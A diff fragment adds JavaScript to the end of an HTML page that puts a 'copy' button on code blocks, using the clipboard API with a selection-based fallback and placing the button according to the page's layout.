+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
